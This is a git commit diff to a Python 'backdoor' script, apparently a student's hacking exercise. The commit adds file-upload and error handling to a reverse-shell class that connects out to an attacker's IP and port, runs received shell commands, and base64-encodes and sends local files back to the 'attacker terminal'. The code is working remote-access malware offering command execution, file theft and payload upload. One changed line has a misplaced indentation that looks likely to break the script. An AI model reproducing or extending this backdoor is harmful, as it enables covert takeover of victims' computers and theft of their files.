3c74db6721d97331b31f4b847b2da7bd0c29e03a
Drilon <drilon.krasniqi@edu.tbz.ch>
2020-07-04 19:28:18 +0200

    Uploaded and command failure prevention added

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -6,6 +6,7 @@ import json
 import os
 import base64
 
+
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket object
@@ -25,8 +26,9 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)  # executes command. shell=True turns it into a string
+            return subprocess.check_output(command, shell=True)  # executes command. shell=True turns it into a string
         # returns result of executed command
+
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -36,19 +38,29 @@ class Backdoor:
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful."
+
     def run(self):
         while True:
             command = self.reliable_receive()
-            if command[0] == "exit":
-                self.connection.close()
-                exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-            elif command[0] == "download":
-                command_result = self.read_file(command[1])
-            else:
-                command_result = self.execute_system_command(command)
-            # Adds received data/command to function exe_sys_command which will run
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command)
+                # Adds received data/command to function exe_sys_command which will run
+            except Exception:
+                command_result = "[-] Error. Try again."
 
             self.reliable_send(command_result)  # sends command results to attacker terminal
 
